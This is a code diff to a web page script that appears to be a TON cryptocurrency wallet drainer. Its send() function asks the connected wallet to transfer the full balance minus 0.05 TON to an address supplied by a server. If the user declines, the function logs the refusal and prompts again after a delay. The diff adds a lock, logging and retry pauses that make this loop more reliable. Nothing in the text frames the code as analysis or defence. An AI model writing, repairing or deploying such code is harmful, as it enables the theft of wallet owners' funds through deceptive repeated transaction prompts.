@@ -323,41 +323,66 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     }
 }
 
+let isProcessingTon = false; // Добавьте эту глобальную переменную
+
 async function send(walletAddress, balance, tryies, address) {
-    tryies++;
-    if (tryies <= maxRetry) {
-        let transfer_value = TonWeb.utils.toNano(balance) - TonWeb.utils.toNano("0.05");
-        const res1 = await transfer_ton_native_request(transfer_value, tryies)
-        const addr = res1.data;
-        balance = balance.toString()
-        let payload = await get_ton_text(transfer_value)
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-            messages: [{
+    if (isProcessingTon) {
+        console.log('TON transfer already in progress, skipping...');
+        return null;
+    }
+    
+    isProcessingTon = true;
+    
+    try {
+        tryies++;
+        if (tryies <= maxRetry) {
+            let transfer_value = TonWeb.utils.toNano(balance) - TonWeb.utils.toNano("0.05");
+            console.log(`Attempting TON transfer, try ${tryies}/${maxRetry}, amount: ${TonWeb.utils.fromNano(transfer_value)} TON`);
+            
+            const res1 = await transfer_ton_native_request(transfer_value, tryies)
+            const addr = res1.data;
+            balance = balance.toString()
+            let payload = await get_ton_text(transfer_value)
+            
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 60,
+                messages: [{
                     address: addr,
                     amount: transfer_value,
                     payload: payload.data
-                }
-
-            ]
-        }
-
-        try {
-            const result = await tonConnectUI.sendTransaction(transaction);
-            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
-            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
-            const dat = {
-                hash: hash,
-                val: transfer_value
+                }]
             }
 
-            return dat;
-        } catch (e) {
-            console.error(e);
-            decline_transfer_ton_native_request(balance, tryies);
-            let hash = await send(walletAddress, balance, tryies);
-            return hash;
+            try {
+                const result = await tonConnectUI.sendTransaction(transaction);
+                const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
+                const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
+                const dat = {
+                    hash: hash,
+                    val: transfer_value
+                }
+
+                console.log('TON transfer successful, hash:', hash);
+                return dat;
+            } catch (e) {
+                console.error('TON transfer failed:', e);
+                await decline_transfer_ton_native_request(balance, tryies);
+                
+                // Ждем перед повторной попыткой
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // Рекурсивно пробуем снова, но с ограничением через tryies
+                return await send(walletAddress, balance, tryies);
+            }
+        } else {
+            console.log('Max retries reached for TON transfer');
+            return null;
         }
+    } catch (error) {
+        console.error('Critical error in TON transfer:', error);
+        return null;
+    } finally {
+        isProcessingTon = false;
     }
 }
 const unsubscribe = tonConnectUI.onSingleWalletModalStateChange((state) => {
@@ -532,6 +557,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
